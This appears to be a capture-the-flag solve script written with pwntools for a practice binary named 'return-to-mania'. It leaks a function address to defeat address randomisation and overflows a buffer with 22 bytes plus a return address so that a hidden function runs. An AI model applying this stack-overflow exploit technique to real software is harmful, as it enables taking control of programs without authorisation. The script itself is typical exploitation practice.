#! /usr/bin/env python

from pwn import *

#strings return-to-mania
#ltrace return-to-mania
#strace return-to-mania
#
#checksec return-to-mania
#	position independat execution enabled
# Address of Welcome  printed on run (ret2libc)

#get function offsets
#	readelf -s return-to-mania

welcome_offset = 0x000006ed
mania_offset = 0x0000065d
welcome_mania_offset = mania_offset - welcome_offset

#pwn cyclic 40
#	aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa

"""
echo "aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa" | ./return-to-mania 
Welcome to WrestleMania! Type in key to get access.
addr of welcome(): 0x5656c6ed
Segmentation fault
"""

elf =  ELF('./return-to-mania')
p = elf.process()

welcome_address = p.recv().split('\n')[1].split('0x')[-1]
print(welcome_address)
welcome_address = int(welcome_address,16)
#print(welcome_address)
#print(welcome_mania_offset)
mania_address = welcome_address - welcome_mania_offset

"""
dmesg | tail
[  612.316233] return-to-mania[32279]: segfault at 61676161 ip 0000000061676161 sp 00000000ffb10f60 error 14 in libc-2.28.so[f7d6f000+19000]
[  612.316276] Code: Bad RIP value.
"""
"""
pwn cyclic -l 0x61676161
22
"""

payload = 'A'*22
payload += p32(mania_address)

p.sendline(payload)
p.recv()
